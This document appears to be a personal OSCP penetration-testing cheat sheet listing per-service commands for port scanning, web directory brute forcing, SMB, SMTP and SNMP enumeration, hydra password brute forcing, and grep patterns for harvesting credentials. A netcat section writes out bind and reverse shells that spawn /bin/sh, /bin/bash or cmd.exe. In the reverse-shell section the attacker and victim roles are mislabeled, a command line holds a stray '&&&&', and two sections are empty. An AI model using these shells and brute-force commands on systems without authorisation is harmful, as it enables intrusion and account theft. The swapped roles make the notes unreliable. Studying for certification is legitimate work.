# OSCP

# NMAP
```
# EARLY SCANS
nmap --min-rate 10000 <IP> -p-
nmap -A -T5 <IP> -p <ports>

# NMAP SCRIPTS
locate *.nse | grep ftp

# NMAP SCRIPT HELP
nmap --script-help ftp-anon

[-] https://nmap.org/book/nse-usage.html
```

# FTP (21)
```


```

# HTTP (80) / HTTPS (443)
```
# DIRECTORY BRUTEFORCE
gobuster dir -u http://<IP>:<PORT>/<DIR> -w <WORDLIST> -r -e 
gobuster dir -u http://10.10.10.218/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -r -x txt,html,php
dirsearch -u <IP> -e <COMMA SEPARATED EXTENSIONS> -w <WORDLIST> -t 30 -r -R 1 -f

# VULNSCAN
nikto -h <IP> -C all

# SOFTWARE VERSIONS
whatweb http://<IP>:<PORT> -a 4
webtech -u <IP>
```

# NETCAT
```
# BIND SHELL
=> VICTIM MACHINE
$ nc -nlvp $RPORT -e cmd.exe    # WINDOWS
$ nc -nlvp $RPORT -e /bin/sh    # LINUX

=> ATTACK MACHINE
> nc -nv $RHOST $RPORT

# REVERSE SHELL
=> VICTIM MACHINE
> nc -nlvp $LPORT

=> ATTACK MACHINE
> nc -nv $LHOST $LPORT -e /bin/bash
```

# DNS (53)
```

```


# SMB (139,445)
```
crackmapexec smb $IP
nbtscan $IP/$CIDR
nmap -p139,445 --script smb-enum-users $IP
nmap -p139,445 --script=smb-vuln-* --script-args=unsafe=1 $IP
enum4linux $IP
smbclient -L $IP -N
smbclient \\$IP\$SHARE -N
```

# SMTP (25) / SMTPS (465,587)
```
# GRAB BANNER
nc -vn $IP 25

# RUN ALL NMAP SMTP SCRIPTS
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP

# ENUM USERS
smtp-user-enum -M VRFY -U $USER_LIST -t $IP

# SMTPS CONNECT (TWO DIFF WAYS)
openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

# FIND MX SERVERS OF AN ORG
dig +short mx $DOMAIN_NAME

# HYDRA BRUTE FORCE
hydra -P $PASS_LIST $IP smtp -V
```

# SNMP (161,162,10161,10162)
```
# BRUTEFORCE SNMP COMMUNITY STRINGS
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP

# SNMP COMMUNITY STRING MIB VALUE ENUMERATION
snmpwalk -c $COM_STR -v1 $IP
snmpwalk -c $COM_STR -v1 $IP $OID
snmpwalk -v X -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull		# Enumerate further

# USING braa
Syntax: braa [Community-string]@[IP of SNMP server]:[iso id]
braa public@192.168.1.125:.1.3.6.*
grep ".1.3.6.1.2.1.1.1.0" *.snmp			# Identify harvested devices (sysDesc)
grep -i "trap" *.snmp						# ID private string
grep -i "login\|fail" *.snmp				# ID usernames / passwords
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" *.snmp		# ID emails
```
